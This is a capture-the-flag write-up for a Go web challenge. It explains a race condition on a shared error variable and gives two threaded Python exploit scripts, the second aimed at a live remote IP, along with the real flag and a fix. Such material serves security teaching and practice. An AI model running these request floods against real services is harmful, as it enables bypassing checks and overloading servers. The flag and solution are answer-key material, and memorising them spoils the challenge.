# Web Chall 2

Author: `marlithor-cyber`

Challenge name: `No skill just luck`

## Summary

The challenge is a small Go flag checker behind nginx:

- `service/main.go`
- `service/templates/index.html`
- `nginx/default.conf`

At first glance it looks like the intended bug is the `X-Forwarded-For` handling in `isLocalRequest()`, but the actual exploitable issue is the shared `err` variable inside the request handler.

Flag:

```text
LB{761201b446ac76c2954db53e086d9d6d}
```

## Root Cause

In `main()`, the handler closes over a single mutable `err` variable:

```go
func main() {
    var err error
    ...
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
```

For `POST /`, the code does:

```go
err = checkFlag(flag)
if err != nil {
    err = tmpl.Execute(w, map[string]interface{}{
        "Error": "Invalid flag",
    })
    return
}
err = tmpl.Execute(w, map[string]interface{}{
    "Success": true,
    "Flag":    FLAG,
})
```

For a normal `GET /`, the same shared variable is overwritten with:

```go
err = tmpl.Execute(w, map[string]interface{}{})
```

Since handlers run concurrently, one request can modify `err` while another request is still using it.

The winning race is:

1. Send a `POST /` with a wrong flag.
2. That request sets `err = checkFlag(flag)`, so `err` becomes non-nil.
3. Before it reaches `if err != nil`, another request hits `GET /`.
4. The `GET /` path executes the template successfully and overwrites the same shared `err` with `nil`.
5. The bad `POST` now sees `err == nil` and falls through to the success branch, which renders the real flag.

So the exploit is a plain race condition caused by shared mutable state across requests.

## Local Verification

The bundled docker setup uses a placeholder flag:

```text
LB{REDACTED}
```

Running many concurrent `GET` and invalid `POST` requests against the local stack returns that placeholder flag, which confirms the race.

Example local exploit:

```python
import threading, requests, time

URL = "http://127.0.0.1:1924/"
found = []
stop = False
session = requests.Session()

def spam_get():
    global stop
    while not stop:
        try:
            session.get(URL, timeout=1)
        except Exception:
            pass

def spam_post():
    global stop
    while not stop:
        try:
            r = session.post(URL, data={"flag": "LB{nope}"}, timeout=1)
            if "Correct! Here is your flag:" in r.text:
                found.append(r.text)
                stop = True
                return
        except Exception:
            pass

threads = []
for _ in range(20):
    t = threading.Thread(target=spam_get, daemon=True)
    t.start()
    threads.append(t)

for _ in range(20):
    t = threading.Thread(target=spam_post, daemon=True)
    t.start()
    threads.append(t)

start = time.time()
while time.time() - start < 10 and not stop:
    time.sleep(0.1)

print(found[0] if found else "no flag")
```

## Live Exploit

The same race works against the remote service. The only change is the target URL:

```python
URL = "http://158.160.221.45:1924/"
```

Using thread-local sessions and more workers makes the race land faster:

```python
import threading, requests, time, re

URL = "http://158.160.221.45:1924/"
found = []
stop = False
thread_local = threading.local()

def sess():
    if not hasattr(thread_local, "s"):
        thread_local.s = requests.Session()
    return thread_local.s

def spam_get():
    global stop
    while not stop:
        try:
            sess().get(URL, timeout=2)
        except Exception:
            pass

def spam_post():
    global stop
    while not stop:
        try:
            r = sess().post(URL, data={"flag": "LB{nope}"}, timeout=2)
            if "Correct! Here is your flag:" in r.text:
                m = re.search(r"LB\\{[^<\\s]+\\}", r.text)
                found.append(m.group(0) if m else r.text)
                stop = True
                return
        except Exception:
            pass

threads = []
for _ in range(40):
    t = threading.Thread(target=spam_get, daemon=True)
    t.start()
    threads.append(t)

for _ in range(40):
    t = threading.Thread(target=spam_post, daemon=True)
    t.start()
    threads.append(t)

start = time.time()
while time.time() - start < 30 and not stop:
    time.sleep(0.05)

print(found[0] if found else "NOFLAG")
```

That returned:

```text
LB{761201b446ac76c2954db53e086d9d6d}
```

## Notes

- `isLocalRequest()` is also sloppy, but it is not required for the solve.
- nginx just forwards requests to the Go app; the actual vulnerability is in the Go handler state management.
- The bug is a classic race on shared state. Making `err` request-local fixes the issue immediately.
